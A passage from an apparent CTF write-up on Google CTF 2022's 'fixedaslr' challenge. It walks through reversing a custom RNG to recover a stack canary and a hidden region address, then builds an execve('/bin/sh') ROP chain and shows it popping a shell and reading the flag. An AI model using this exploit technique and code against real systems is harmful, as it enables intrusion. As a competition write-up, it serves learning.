+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">rand</span><span class="p">(</span><span class="kt">int</span> <span class="n">bits</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bits</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">rand_get_bit</span><span class="p">()</span> <span class="o">|</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">result</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">rand</code> will call <code class="language-plaintext highlighter-rouge">rand_get_bit</code> for every bit and shift it to the left, thus calculating the resulting random number.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint8_t</span> <span class="nf">rand_get_bit</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="kt">int</span> <span class="n">bit1</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">63</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">bit2</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span> <span class="o">^</span> <span class="n">bit1</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">bit3</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span> <span class="o">^</span> <span class="n">bit2</span><span class="p">;</span>
+
+  <span class="kt">uint8_t</span> <span class="n">result_bit</span> <span class="o">=</span> <span class="n">bit3</span> <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">58</span><span class="p">)</span> <span class="o">^</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">rand_state</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">rand_state</span><span class="p">)</span> <span class="o">|</span> <span class="n">result_bit</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="n">result_bit</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Get bit at offset from rand_state</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">rand_extract_bit</span><span class="p">(</span><span class="kt">int</span> <span class="n">bitOffset</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="p">(</span><span class="n">rand_state</span> <span class="o">&gt;&gt;</span> <span class="n">bitOffset</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">rand_get_bit</code> will calculate a random bit based on bits in <code class="language-plaintext highlighter-rouge">rand_state</code>, then shift <code class="language-plaintext highlighter-rouge">rand_state</code> by 1 bit to the left and append the resulting bit at the end of <code class="language-plaintext highlighter-rouge">rand_state</code>.</p>
+
+<p>Soooo, <code class="language-plaintext highlighter-rouge">rand</code> is also used for calculating the <code class="language-plaintext highlighter-rouge">aslr</code> addresses of the object regions, and we know the addresses for those and we also know the order, in which they were calculated (<code class="language-plaintext highlighter-rouge">main</code>, <code class="language-plaintext highlighter-rouge">syscalls</code>, <code class="language-plaintext highlighter-rouge">guard</code>, <code class="language-plaintext highlighter-rouge">basic</code>, <code class="language-plaintext highlighter-rouge">game</code>, <code class="language-plaintext highlighter-rouge">res</code>, <code class="language-plaintext highlighter-rouge">debug</code>).</p>
+
+<p>Though, while being quite confident, that this process should definitely be reversable, I’m not that good at rng reverse magic, so I would have been quite stuck at that point.</p>
+
+<p>But what do we have team colleagues for? :)</p>
+
+<p>So, I cleaned up the current script, ordered the leaks in the way, they would have been produced by the random number generator and summarized my idea in discord and asked for help from our crypto/math geniuses.</p>
+
+<p>And thankfully, <a href="https://twitter.com/rkm0959" target="_blank">rkm0959</a> picked it up and quickly came up with a sage algo to calculate back the <code class="language-plaintext highlighter-rouge">random_state</code>, providing the <code class="language-plaintext highlighter-rouge">stack guard canary</code> and also the address of the <code class="language-plaintext highlighter-rouge">debug</code> region (which can be derived by calculating the next random value after <code class="language-plaintext highlighter-rouge">res</code> region).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">rand_state</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">rand_extract_bit</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">rand_state</span>
+    <span class="k">return</span> <span class="p">((</span><span class="n">rand_state</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">rand_get_bit</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">rand_state</span>
+    <span class="n">v0</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">63</span><span class="p">)</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span> <span class="o">^</span> <span class="n">v0</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span> <span class="o">^</span> <span class="n">v1</span> 
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mi">58</span><span class="p">)</span> <span class="o">^</span> <span class="mi">1</span> 
+    <span class="n">rand_state</span> <span class="o">=</span> <span class="p">((</span><span class="mi">2</span> <span class="o">*</span> <span class="n">rand_state</span><span class="p">)</span> <span class="o">|</span> <span class="n">v3</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">v3</span> 
+
+<span class="k">def</span> <span class="nf">get_rand</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">ret</span> <span class="o">|</span> <span class="n">rand_get_bit</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">leaks_to_stack</span><span class="p">(</span><span class="n">leaks</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">rand_state</span>
+    <span class="n">one_vec</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">init</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
+        <span class="n">tt</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">65</span><span class="p">)</span>
+        <span class="n">tt</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+        <span class="n">init</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">tt</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
+        <span class="n">new_vec</span> <span class="o">=</span> <span class="n">init</span><span class="p">[</span><span class="mi">63</span><span class="p">]</span> <span class="o">+</span> <span class="n">init</span><span class="p">[</span><span class="mi">61</span><span class="p">]</span> <span class="o">+</span> <span class="n">init</span><span class="p">[</span><span class="mi">60</span><span class="p">]</span> <span class="o">+</span> <span class="n">init</span><span class="p">[</span><span class="mi">58</span><span class="p">]</span> <span class="o">+</span> <span class="n">one_vec</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+            <span class="n">init</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">init</span><span class="p">[</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">init</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_vec</span>
+    <span class="n">M</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">fin</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">leaks</span><span class="p">)):</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span>
+            <span class="n">new_vec</span> <span class="o">=</span> <span class="n">init</span><span class="p">[</span><span class="mi">63</span><span class="p">]</span> <span class="o">+</span> <span class="n">init</span><span class="p">[</span><span class="mi">61</span><span class="p">]</span> <span class="o">+</span> <span class="n">init</span><span class="p">[</span><span class="mi">60</span><span class="p">]</span> <span class="o">+</span> <span class="n">init</span><span class="p">[</span><span class="mi">58</span><span class="p">]</span> <span class="o">+</span> <span class="n">one_vec</span>
+            <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+                <span class="n">init</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">init</span><span class="p">[</span><span class="n">k</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+            <span class="n">init</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_vec</span>
+            <span class="n">target</span> <span class="o">=</span> <span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">11</span> <span class="o">-</span> <span class="n">j</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span>
+            <span class="n">fin</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="mi">2</span><span class="p">)(</span><span class="n">init</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">target</span><span class="p">))</span>
+            <span class="n">ff</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
+                <span class="n">ff</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">init</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">k</span><span class="p">])</span>
+            <span class="n">M</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ff</span><span class="p">)</span>
+    <span class="n">fin</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="n">fin</span><span class="p">)</span>
+    <span class="n">M</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="n">M</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">v</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">solve_right</span><span class="p">(</span><span class="n">fin</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
+            <span class="n">ret</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>
+        <span class="n">rand_state</span> <span class="o">=</span> <span class="n">ret</span>
+        <span class="n">canary</span> <span class="o">=</span> <span class="n">get_rand</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+            <span class="n">get_rand</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+        <span class="n">final_leak</span> <span class="o">=</span> <span class="n">get_rand</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">[</span><span class="n">canary</span><span class="p">,</span> <span class="n">final_leak</span><span class="p">]</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="p">...</span>
+<span class="n">REGIONS</span> <span class="o">=</span> <span class="p">[</span><span class="n">MAINRX</span><span class="p">,</span> <span class="n">SYSCALLSRX</span><span class="p">,</span> <span class="n">GUARDRX</span><span class="p">,</span> <span class="n">BASICRX</span><span class="p">,</span> <span class="n">GAMERX</span><span class="p">,</span> <span class="n">RESBASE</span><span class="p">]</span>
+
+<span class="n">leaks</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="n">REGIONS</span><span class="p">))</span>
+
+<span class="n">CANARY</span><span class="p">,</span> <span class="n">DEBUG</span> <span class="o">=</span> <span class="n">leaks_to_stack</span><span class="p">(</span><span class="n">leaks</span><span class="p">)</span>
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="n">DEBUG</span> <span class="o">&lt;&lt;</span> <span class="mh">0x1c</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"canary   : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARY</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"debug    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">DEBUG</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Starting local process './loader': pid 120754
+[120754]
+[*] Paused (press any to continue)
+main     : 0xe750000000
+game     : 0x19c0000000
+basic    : 0xe270000000
+guard    : 0x8780000000
+res      : 0xc550000000
+syscalls : 0x2020000000
+canary   : 0xb37ddcfa2450d8f
+debug    : 0x35b0000000</code></pre></figure>
+
+<p>Now, we got everything we need to exploit the buffer overflow and write a simple <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code> ropchain.</p>
+
+<p>We just need to play the game and get a score, that qualifies us for the scoreboard.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">play_until_score</span><span class="p">(</span><span class="n">target_score</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+  <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How much is "</span><span class="p">)</span>
+    <span class="n">expr</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" ?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"You have "</span><span class="p">)</span>
+    <span class="n">score</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"pts"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="n">target_score</span><span class="p">:</span>
+      <span class="k">break</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>	
+  <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>Since we have access to <code class="language-plaintext highlighter-rouge">debug.o</code> now, which contains all the gadgets you could wish for, we can easily craft a ropchain and finish this.</p>
+
+<p>When triggering our ropchain, <code class="language-plaintext highlighter-rouge">rdi</code> will already point to the start of our name, so we can just start it with <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> and omit <code class="language-plaintext highlighter-rouge">pop rdi</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">POPRAX</span> <span class="o">=</span> <span class="n">DEBUG</span> <span class="o">+</span> <span class="mh">0x1007</span>
+<span class="n">POPRDI</span> <span class="o">=</span> <span class="n">DEBUG</span> <span class="o">+</span> <span class="mh">0x1001</span>
+<span class="n">POPRSI</span> <span class="o">=</span> <span class="n">DEBUG</span> <span class="o">+</span> <span class="mh">0x1004</span>
+<span class="n">POPRDX</span> <span class="o">=</span> <span class="n">DEBUG</span> <span class="o">+</span> <span class="mh">0x1010</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">SYSCALLSRX</span> <span class="o">+</span> <span class="mh">0x1002</span>
+	
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">40</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CANARY</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="n">play_until_score</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to b'fixedaslr.2022.ctfcompetition.com' on port 1337: Done
+main     : 0xa710000000
+game     : 0x3a20000000
+basic    : 0x6140000000
+guard    : 0xbb40000000
+res      : 0x51e0000000
+syscalls : 0x73f0000000
+canary   : 0xa8bb342d9de5ad95
+debug    : 0xea30000000
+$ ls
+basic.o
+debug.o
+flag
+game.o
+guard.o
+loader
+main.o
+res.o
+syscalls.o
+$ cat flag
+CTF{GuessYouCanSayTheCookieGotRandomlyBroken}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Google Capture The Flag 2022 - fixedaslr&amp;url=https://kileak.github.io/ctf/2022/googlectf22-fixedaslr/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2022/googlectf22-fixedaslr/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2022/googlectf22-fixedaslr';
+        var disqus_title = 'Google Capture The Flag 2022 - fixedaslr';
+        var disqus_url = 'https://kileak.github.io/ctf/2022/googlectf22-fixedaslr';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
